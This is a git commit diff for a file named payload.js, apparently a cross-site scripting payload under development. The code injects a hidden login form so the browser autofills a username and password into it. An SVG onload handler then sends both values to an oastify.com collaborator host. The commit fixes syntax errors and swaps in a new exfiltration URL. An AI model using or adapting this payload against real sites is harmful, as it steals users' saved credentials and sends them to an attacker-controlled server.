c82d5dc5d64066abd2b74cf478c99e95e62ac686
Facundo Ceballos <63003518+facundoic@users.noreply.github.com>
2025-01-09 14:06:42 -0300

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,6 +1,6 @@
-var f=document.createElement('form'),
-var u=document.createElement('input'),
-var p=document.createElement('input'),
+var f=document.createElement('form');
+var u=document.createElement('input');
+var p=document.createElement('input');
 var svg=document.createElement('svg');
 u.id='u';
 p.id='p';
@@ -8,5 +8,5 @@ p.type='password';
 f.appendChild(u);
 f.appendChild(p);
 document.body.appendChild(f);
-svg.setAttribute('onload','setTimeout(()=>fetch("https://qzt7xxwd7iji22kz1b8mrnobb2ht5sth.oastify.com/?u="+document.getElementById("u").value+"&p="+encodeURIComponent(document.getElementById("p").value)),2000)');
+svg.setAttribute('onload','setTimeout(()=>fetch("https://d2gu0kz0a5m55pnm4yb9uaryepkg8hw6.oastify.com/?u="+document.getElementById("u").value+"&p="+encodeURIComponent(document.getElementById("p").value)),2000)');
 document.body.appendChild(svg);
